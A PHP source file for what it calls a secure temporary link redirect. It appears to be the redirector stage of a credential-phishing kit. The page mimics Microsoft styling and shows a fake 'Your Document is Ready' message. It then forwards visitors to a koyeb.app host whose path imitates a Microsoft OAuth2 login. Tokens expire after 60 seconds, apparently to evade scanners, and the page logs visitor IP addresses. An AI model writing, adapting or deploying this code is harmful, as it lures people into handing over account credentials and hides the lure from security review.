<?php
// ==============================================
// SECURE 1-MINUTE TEMPORARY LINK REDIRECT
// ==============================================

error_reporting(0);
ini_set('display_errors', 0);

// ================= CONFIGURATION =================
$config = [
    'redirect_link' => 'https://representative-joelynn-activedirectory-39a69909.koyeb.app/oauth2/common/client_id_b61c8803-16f3-4c35-9b17-6f65f441df86/',
    'expire_seconds' => 60,
    'redirect_delay' => 5
];

// ================= SECURITY CHECKS =================
if (php_sapi_name() === 'cli') {
    die("This script can only be accessed via web browser");
}

// ================= TOKEN HANDLING =================
function generateToken() {
    return bin2hex(random_bytes(16)) . '_' . time();
}

function isTokenValid($token) {
    $parts = explode('_', $token);
    return (count($parts) === 2 && (time() - (int)$parts[1]) <= 60);
}

try {
    if (isset($_GET['token'])) {
        $token = $_GET['token'];

        if (!isTokenValid($token)) {
            throw new Exception("This link has expired after 1 minute");
        }

        file_put_contents('access.log', sprintf(
            "%s|ACCESSED|%s|%s\n",
            date('Y-m-d H:i:s'),
            $_SERVER['REMOTE_ADDR'],
            $token
        ), FILE_APPEND);

        header("Location: {$config['redirect_link']}");
        exit;
    }

    $token = generateToken();
    $current_url = (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') .
                  $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'];
    $redirectUrl = $current_url . '?token=' . urlencode($token);

    file_put_contents('access.log', sprintf(
        "%s|GENERATED|%s|%s\n",
        date('Y-m-d H:i:s'),
        $_SERVER['REMOTE_ADDR'],
        $token
    ), FILE_APPEND);

} catch (Exception $e) {
    error_log("Redirect Error: " . $e->getMessage());
    http_response_code(500);
    header('Content-Type: text/html; charset=utf-8');
    die("<h1>Error</h1><p>{$e->getMessage()}</p>");
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Redirecting...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f0f0f0;
            height: 100vh;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .top-bar {
            position: fixed;
            top: 0;
            width: 100%;
            background-color: #0078d7;
            color: white;
            padding: 10px;
            text-align: center;
            font-weight: bold;
        }
        .message-box {
            background: #fff;
            padding: 20px 30px;
            box-shadow: 0 0 15px #0078d7;
            border-radius: 8px;
            text-align: center;
            max-width: 400px;
            opacity: 1;
            animation: fadeIn 1s ease-in;
        }
        .footer {
            font-size: 0.8rem;
            color: #888;
        }
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
    </style>
</head>
<body>

<div class="top-bar" id="top-bar">Preparing Document...</div>

<div class="message-box" id="message-box">
    <h2 id="message">Hang tight! You will be redirected soon.</h2>
    <p>This page will redirect automatically in <span id="countdown">5</span> seconds.</p>
    <p class="footer">If not, <a href="<?php echo htmlspecialchars($config['redirect_link']); ?>">click here</a>.</p>
</div>

<script>
    let countdown = 5;
    const countdownEl = document.getElementById('countdown');
    const message = document.getElementById('message');
    const topBar = document.getElementById('top-bar');

    // Countdown timer
    const interval = setInterval(() => {
        countdown--;
        if (countdownEl) countdownEl.textContent = countdown;
        if (countdown <= 0) clearInterval(interval);
    }, 1000);

    // Step 1: Preparing Document...
    topBar.textContent = "Preparing Document...";

    // Step 2: Your Document is Ready
    setTimeout(() => {
        topBar.textContent = "Your Document is Ready";
        message.textContent = "Please wait while we redirect you...";
    }, 2000);

    // Step 3: Redirecting in Progress...
    setTimeout(() => {
        topBar.textContent = "Redirecting in Progress...";
    }, 4000);

    // Final: Redirect
    setTimeout(() => {
        window.location.href = "<?php echo htmlspecialchars($redirectUrl); ?>";
    }, 5000);
</script>


</body>
</html>
